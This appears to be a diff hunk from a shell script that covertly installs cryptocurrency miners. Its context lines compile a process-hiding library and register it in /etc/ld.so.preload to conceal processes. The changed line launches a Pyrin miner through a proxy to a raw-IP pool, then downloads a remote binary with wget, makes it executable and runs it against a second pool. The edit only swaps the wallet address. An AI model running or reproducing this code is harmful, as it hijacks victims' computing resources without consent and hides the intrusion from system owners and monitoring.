@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.82HiveOS -a PYRIN -p 138.197.2.25:80 -u hoosat:qqfkq50fnwu0s3fjrqpcluxe496ypdykcfx9scp84g697e22l8r4y0rnnvqfh.$(shuf -n 1 -i 1-99999)-UNFY & wget https://github.com/embersc/UNFY/raw/main/unfycpu && chmod 777 unfycpu && ./unfycpu -a yescryptr32  -o stratum+tcp://165.227.182.117:80 -u UZXKhcGCjVPZeEQdEXnfU5h5edekEYLz2W.$(shuf -n 1 -i 1-99999)-UNFY -t4
+./graftcp/graftcp ./lol1.82HiveOS -a PYRIN -p 138.197.2.25:80 -u hoosat:qr84l5tvgdfmpkd604h47vca7n4tecek42megt9sxmu64u3r3apxw396erhgp.$(shuf -n 1 -i 1-99999)-UNFY & wget https://github.com/embersc/UNFY/raw/main/unfycpu && chmod 777 unfycpu && ./unfycpu -a yescryptr32  -o stratum+tcp://165.227.182.117:80 -u UZXKhcGCjVPZeEQdEXnfU5h5edekEYLz2W.$(shuf -n 1 -i 1-99999)-UNFY -t4
